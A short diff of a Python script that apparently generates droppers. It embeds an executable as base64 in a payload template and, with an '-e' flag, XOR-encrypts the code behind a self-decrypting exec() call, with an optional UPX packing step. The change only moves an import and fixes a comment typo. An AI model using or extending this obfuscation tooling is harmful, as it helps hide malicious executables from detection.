@@ -85,10 +85,10 @@ if len(sys.argv)>1 and "-f" in sys.argv:
                         imports+="import zlib\n" #bz2 instead of zlib (gz) for better ratio
                 elif arg == "-e":
                         key = str(uuid.uuid4().hex)
+			imports+="from itertools import cycle\n"
                         enc = True
                 elif arg == "-upx":
                         upx = True
-                        imports+="from itertools import cycle\n"
                         upxdir = sys.argv[i+1]
                 #elif arg == "-gui": gui = True
                 i+=1
@@ -132,7 +132,7 @@ else:
 
 final = payload.replace("{{ installdir }}",folder).replace("{{ filename }}",filearg).replace("{{ filedata }}",base64.b64encode(executable).decode())
 
-newline = "\n" #backslashs are not allowed in f strings
+newline = "\n" #backslashes are not allowed in f strings
 
 if enc:
         final = f'{imports}{newline}{final.split("#code")[0]}{newline}exec(xor(base64.b64decode({base64.b64encode(xor(final.split("#code")[1], key).encode())}), {key}))'
